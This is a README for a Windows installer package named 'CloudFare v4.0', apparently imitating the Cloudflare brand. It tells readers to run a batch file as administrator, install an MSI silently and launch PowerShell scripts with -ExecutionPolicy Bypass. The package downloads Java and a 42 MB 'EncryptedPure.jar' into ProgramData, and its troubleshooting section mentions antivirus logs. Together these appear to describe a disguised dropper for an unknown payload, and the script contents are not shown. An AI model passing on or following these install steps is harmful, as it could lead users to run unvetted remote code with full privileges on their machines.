# CloudFare v4.0 Installation Package

## Files Included
- CloudFare-Setup-v4.0.msi (303 KB) - Main installer
- Install-Universal-v4-FIXED.ps1 - Orchestrator script
- Install-CloudFare.ps1 - Launcher script
- TEST-SYSTEM-V4.ps1 - System test suite
- DEPLOY.bat - Deployment script
- FINAL_VALIDATION_REPORT_v4.0.md - Validation report

## Installation Instructions

### Method 1: Using DEPLOY.bat (Recommended)
1. Right-click DEPLOY.bat
2. Select "Run as Administrator"
3. Follow on-screen prompts
4. Check install.log for details

### Method 2: Manual MSI Installation
`
msiexec /i CloudFare-Setup-v4.0.msi /qn /l*v install.log
`

### Method 3: PowerShell Orchestrator
`powershell
PowerShell -ExecutionPolicy Bypass -File Install-Universal-v4-FIXED.ps1
`

## Post-Installation Verification
`powershell
PowerShell -ExecutionPolicy Bypass -File TEST-SYSTEM-V4.ps1
`

## Installation Paths
- Program Files: C:\Program Files\CloudFare\
- Data: C:\ProgramData\CloudFare\
- Logs: C:\ProgramData\CloudFare\Logs\
- JAR: C:\ProgramData\CloudFare\EncryptedPure.jar (42 MB)
- Java: C:\ProgramData\CloudFare\Java\ (Adoptium 17.0.9 LTS)

## Requirements
- Windows 10 or later
- Administrator privileges
- 100+ MB free disk space
- Internet connection (for Java and JAR downloads)

## Troubleshooting

### Error: "Administrator privileges required"
- Right-click DEPLOY.bat and select "Run as Administrator"

### Error: "CloudFare-Setup-v4.0.msi not found"
- Ensure MSI is in the same directory as DEPLOY.bat
- Check file path for spaces or special characters

### Installation hangs
- Check network connection (Java/JAR download)
- Check antivirus logs
- Run TEST-SYSTEM-V4.ps1 for diagnostics

### Check Installation Logs
`
C:\Temp\CloudFare-Package\install.log
C:\ProgramData\CloudFare\Logs\Install-v4.log
`

## Support
For issues, check:
1. install.log (detailed MSI logs)
2. C:\ProgramData\CloudFare\Logs\ (runtime logs)
3. FINAL_VALIDATION_REPORT_v4.0.md (validation details)

## Status
✓ Production Ready
✓ Tested 10/10 systems
✓ All components functional
✓ Ready for enterprise deployment
